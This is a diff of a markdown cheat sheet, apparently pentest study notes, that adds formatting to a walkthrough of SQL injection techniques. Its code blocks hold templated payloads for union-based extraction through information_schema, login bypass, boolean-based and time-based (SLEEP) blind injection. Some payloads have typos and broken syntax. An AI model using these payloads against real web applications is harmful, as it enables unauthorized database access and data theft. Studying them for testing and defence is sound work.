@@ -1,14 +1,18 @@
 # SQL Injection
 
-## In-Band&#x20;
+## <mark style="color:green;">In-Band</mark>&#x20;
 
 Refers to the same method of communication being used to exploit the vulnerability and also receive the results.
 
-### Error-Based
+
+
+### <mark style="color:green;">Error-Based</mark>
 
 Obtaining information about the database structure as error messages from the database are printed directly to the browser screen.
 
-### Union-Based
+
+
+### <mark style="color:green;">Union-Based</mark>
 
 Use SQL UNION operator to return additional results to the page, letting the extraction of large amounts of data.
 
@@ -23,6 +27,8 @@ $url/query?$column=$value UNION SELECT 1,2,3 #Try Until theres no message error
 ```
 {% endcode %}
 
+***
+
 * Change query value
 
 <pre class="language-sql" data-overflow="wrap" data-line-numbers><code class="lang-sql"><strong>$url/query?$column=$changedvalue SELECT UNION $found
@@ -33,6 +39,8 @@ $url/query?$column=$value UNION SELECT 1,2,3 #Try Until theres no message error
 `$found` is the union value that have been caught in previous step
 {% endhint %}
 
+***
+
 * Check database name
 
 {% code overflow="wrap" lineNumbers="true" %}
@@ -41,6 +49,8 @@ $url/query?$column=$changedvalue UNION $found,database() #Try to get database
 #This will return the name of DB we are searching
 ```
 {% endcode %}
+
+***
 
 * Check information schema for DB and tables information
 
@@ -55,6 +65,8 @@ $url/query?$column=$changedvalue UNION $found,group_concat(table_name) FROM info
 `$dbfound`is the result of previuos query
 {% endhint %}
 
+***
+
 * Check information schema for DB and tables information
 
 {% code overflow="wrap" lineNumbers="true" %}
@@ -63,6 +75,8 @@ $url/query?$column=$changedvalue UNION $found,group_concat(colum_name) FROM info
 #This will return a string with all colums of the table
 ```
 {% endcode %}
+
+***
 
 * Obtain the values that we were looking for
 
@@ -73,11 +87,17 @@ $url/query?$column=$changedvalue UNION $found,group_concat(colum_name) FROM info
 ```
 {% endcode %}
 
-## Blind
+***
+
+
+
+## <mark style="color:green;">Blind</mark>
 
 Results of the attack can't directly be seen on the screen,we get little to no feedback to confirm whether our injected queries were.
 
-### Autenthication Bypass
+
+
+### <mark style="color:green;">Autenthication Bypass</mark>
 
 Method consisting in consider that the web application isn't interested in the content of the username and password but more whether the two make a matching pair in the users table.
 
@@ -89,6 +109,8 @@ SELECT * from users WHERE username='%username%' and password='%password%' LIMIT 
 ```
 {% endcode %}
 
+***
+
 * Make an insertion in password field
 
 {% code overflow="wrap" lineNumbers="true" %}
@@ -97,7 +119,11 @@ SELECT * from users WHERE username='%username%' and password='%password%' LIMIT 
 ```
 {% endcode %}
 
-### Boolean Based
+***
+
+
+
+### <mark style="color:green;">Boolean Based</mark>
 
 Use the response we receive back from our injection if this only have two outcomes
 
@@ -105,6 +131,8 @@ Use the response we receive back from our injection if this only have two outcom
 
 <pre class="language-sql" data-overflow="wrap" data-line-numbers><code class="lang-sql"><strong>$url/$query?$column=$value
 </strong></code></pre>
+
+***
 
 * Use union injection until the state change
 
@@ -116,6 +144,8 @@ $url/query?$column=$changedvalue' UNION SELECT 1,2,3; #Try Until the result chan
 #This will determinate the number of colums
 ```
 {% endcode %}
+
+***
 
 * Find database name by iteration
 
@@ -136,6 +166,8 @@ $url/query?$column=$changedvalue' UNION SELECT $found where database() LIKE '$le
 `$letter` is the value that return true in each iteration
 {% endhint %}
 
+***
+
 * Find Table name by iteration
 
 {% code overflow="wrap" lineNumbers="true" %}
@@ -144,6 +176,8 @@ $url/query?$column=$changedvalue' UNION $found FROM information_schema.tables WH
 #Repeat until found all table name
 ```
 {% endcode %}
+
+***
 
 * Find column by iteration
 
@@ -154,6 +188,8 @@ $url/query?$column=$changedvalue' UNION $found FROM information_schema.tables WH
 ```
 {% endcode %}
 
+***
+
 * Find objective value
 
 {% code overflow="wrap" lineNumbers="true" %}
@@ -162,6 +198,8 @@ $url/query?$column=$changedvalue' FROM $table_found WHERE %column_found LIKE 'a%
 #Make iterative process to find value needed
 ```
 {% endcode %}
+
+***
 
 * Value exceptions
 
@@ -176,10 +214,14 @@ $url/query?$column=$changedvalue' UNION $found FROM information_schema.tables WH
 {% endcode %}
 
 {% hint style="info" %}
-`$notobjective` refers to the value that we found but we don't need
+`$notobjective`refers to the value that we found but we don't need
 {% endhint %}
 
-### Time Based
+***
+
+
+
+### <mark style="color:green;">Time Based</mark>
 
 Make use of time a response is generated to the request to determinate if query value was found or not. It is used when we don't get a visual return to the injection.
 
@@ -197,6 +239,8 @@ $url/query?$column=$changedvalue' UNION SELECT SLEEP($time),2;
 The time of a error request is always less than a correct query
 {% endhint %}
 
+***
+
 * Make Boolean based iterative process to map DB,tables and columns you need
 
 {% code overflow="wrap" lineNumbers="true" %}
@@ -207,6 +251,8 @@ $url/query?$column=$changedvalue' UNION SELECT SLEEP($time),$found FROM informat
 ```
 {% endcode %}
 
+***
+
 * Make Boolean based iterative process to find the value you need
 
 {% code overflow="wrap" lineNumbers="true" %}
@@ -216,7 +262,9 @@ $url/query?$column=$changedvalue' UNION SELECT SLEEP($time),$found FROM $table_f
 ```
 {% endcode %}
 
-## Out Of Band
+##
+
+## <mark style="color:green;">Out Of Band</mark>
 
 Depends on DB feature of making some kind of external network call based on the results from an SQL query. Is classified by having two different communication channels:&#x20;
 
